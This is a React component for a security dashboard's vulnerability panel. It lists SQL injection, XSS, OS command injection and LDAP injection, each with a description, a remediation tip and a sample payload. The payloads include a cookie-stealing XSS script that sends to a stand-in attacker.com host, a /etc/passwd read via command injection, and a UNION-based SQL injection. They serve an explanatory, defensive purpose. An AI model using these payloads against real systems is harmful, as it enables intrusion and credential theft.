'use client';

import { useState } from 'react';
import { ShieldAlert, ChevronDown, ChevronUp, Code2, ShieldCheck } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

export interface VulnDetailItem {
  id: string;
  title: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  cwe: string;
  description: string;
  payload: string;
  fix: string;
  color: string;
}

export const DEFAULT_VULN_DETAILS: VulnDetailItem[] = [
  {
    id: 'sqli',
    title: 'SQL Injection (Time-Based & Error-Based)',
    severity: 'CRITICAL',
    cwe: 'CWE-89',
    description: 'Malicious SQL queries injected into data input fields cause unauthorized database access, schema dumping, and data exfiltration.',
    payload: "' UNION SELECT 1, @@version, user(), database() --",
    fix: 'Use parameterized queries / prepared statements with ORM abstraction (e.g. Prisma, TypeORM, SQLAlchemy) and disable verbose database error messages.',
    color: '#ff0051'
  },
  {
    id: 'xss',
    title: 'Cross-Site Scripting (Reflected & DOM-Based XSS)',
    severity: 'HIGH',
    cwe: 'CWE-79',
    description: 'Unsanitized user inputs reflected back into web pages execute arbitrary JavaScript inside victim browser contexts.',
    payload: "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
    fix: 'Context-encode output streams (HTML, JS, URL encoding), implement Content-Security-Policy (CSP) headers, and set HttpOnly flags on session cookies.',
    color: '#ff9500'
  },
  {
    id: 'cmdi',
    title: 'OS Command Injection',
    severity: 'CRITICAL',
    cwe: 'CWE-78',
    description: 'Unfiltered input passed to system command shells allows arbitrary remote code execution on the underlying server system.',
    payload: "; cat /etc/passwd # or | ping -c 4 127.0.0.1",
    fix: 'Avoid direct system command calls (`exec()`, `system()`). Use secure APIs, parameter array arguments, and strict input whitelist validation.',
    color: '#ff0051'
  },
  {
    id: 'ldap',
    title: 'LDAP & XPath Injection',
    severity: 'MEDIUM',
    cwe: 'CWE-90',
    description: 'Constructed LDAP filter expressions modified by malicious input allow authentication bypass and directory attribute harvesting.',
    payload: "*)(uid=*))(|(uid=*",
    fix: 'Sanitize user input used in directory queries using LDAP-encoding libraries to escape special characters like `*`, `(`, `)`, `\\`, and NUL.',
    color: '#ff9500'
  }
];

export default function BottomPanel({ details = DEFAULT_VULN_DETAILS }: { details?: VulnDetailItem[] }) {
  const [expandedDetailId, setExpandedDetailId] = useState<string | null>('sqli');

  return (
    <section className="p-6 md:p-8 border-t border-[#00d4ff]/30 bg-[#080c21]/90 backdrop-blur-md font-mono">
      <div className="max-w-[1600px] mx-auto space-y-6">
        <div className="flex items-center justify-between border-b border-[#00d4ff]/20 pb-4">
          <div>
            <h2 className="text-lg font-extrabold text-[#00d4ff] uppercase tracking-wider flex items-center gap-2">
              <ShieldAlert className="w-5 h-5 text-[#ff0051]" /> VULNERABILITY DETAILS & REMEDIATION
            </h2>
            <p className="text-xs text-[#a0aec0] font-mono mt-1">
              Expandable inspection vectors, verified payloads, and secure code guidelines
            </p>
          </div>
        </div>

        {/* Expandable Vulnerability Accordion Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          {details.map((item) => {
            const isExpanded = expandedDetailId === item.id;
            return (
              <div 
                key={item.id}
                className="rounded-xl bg-[#040714] border border-[#00d4ff]/30 overflow-hidden transition-all hover:border-[#00d4ff]/60"
              >
                <button
                  type="button"
                  onClick={() => setExpandedDetailId(isExpanded ? null : item.id)}
                  className="w-full p-4 flex items-center justify-between text-left bg-[#070b1e] hover:bg-[#0a0e27] transition-colors cursor-pointer"
                >
                  <div className="flex items-center gap-3">
                    <span 
                      className="w-3 h-3 rounded-full shrink-0" 
                      style={{ backgroundColor: item.color, boxShadow: `0 0 10px ${item.color}` }} 
                    />
                    <div>
                      <h3 className="text-sm font-bold text-white font-mono">{item.title}</h3>
                      <span className="text-[10px] font-mono text-[#00d4ff]">{item.cwe}</span>
                    </div>
                  </div>

                  <div className="flex items-center gap-3">
                    <span 
                      className="text-[10px] font-mono font-bold px-2.5 py-0.5 rounded border uppercase"
                      style={{ borderColor: item.color, color: item.color, backgroundColor: `${item.color}15` }}
                    >
                      {item.severity}
                    </span>
                    {isExpanded ? <ChevronUp className="w-4 h-4 text-[#00d4ff]" /> : <ChevronDown className="w-4 h-4 text-[#a0aec0]" />}
                  </div>
                </button>

                <AnimatePresence>
                  {isExpanded && (
                    <motion.div 
                      initial={{ opacity: 0, height: 0 }}
                      animate={{ opacity: 1, height: 'auto' }}
                      exit={{ opacity: 0, height: 0 }}
                      className="p-5 space-y-4 border-t border-[#00d4ff]/20 text-xs font-mono"
                    >
                      <div>
                        <span className="text-[#a0aec0] uppercase font-bold text-[10px] block mb-1">Description:</span>
                        <p className="text-slate-200 leading-relaxed">{item.description}</p>
                      </div>

                      <div>
                        <span className="text-[#00d4ff] uppercase font-bold text-[10px] block mb-1">Verified Payload Vector:</span>
                        <code className="block p-3 rounded bg-[#070b1e] border border-[#00d4ff]/30 text-amber-300 font-mono text-[11px] overflow-x-auto">
                          {item.payload}
                        </code>
                      </div>

                      <div>
                        <span className="text-[#00ff00] uppercase font-bold text-[10px] block mb-1">Recommended Remediation:</span>
                        <p className="text-slate-200 leading-relaxed p-3 rounded bg-[#070b1e] border border-[#00ff00]/30 text-[11px]">
                          {item.fix}
                        </p>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            );
          })}
        </div>
      </div>
    </section>
  );
}
